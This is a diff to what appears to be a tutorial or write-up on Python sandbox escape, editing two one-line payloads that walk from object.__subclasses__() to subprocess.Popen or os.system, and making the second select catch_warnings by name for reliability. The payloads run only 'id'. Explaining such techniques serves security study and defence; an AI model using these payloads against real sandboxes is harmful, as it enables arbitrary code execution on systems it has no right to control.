@@ -79,8 +79,9 @@ That is `object`. Its `__subclasses__()` lists every loaded class, and the attac
 # walk to a class that can run a command via subprocess.Popen
 [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'Popen'][0](['id'])
 
-# reach os through the function globals of warnings.catch_warnings
-().__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__['__builtins__']['__import__']('os').system('id')
+# reach os through the function globals of warnings.catch_warnings,
+# selected by name because its index is not stable across versions
+[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__=='catch_warnings'][0].__init__.__globals__['__builtins__']['__import__']('os').system('id')
 ```
 
 The index into `__subclasses__()` is deployment-specific, so the technique is to enumerate the list first and select by `__name__` rather than hardcoding a position:
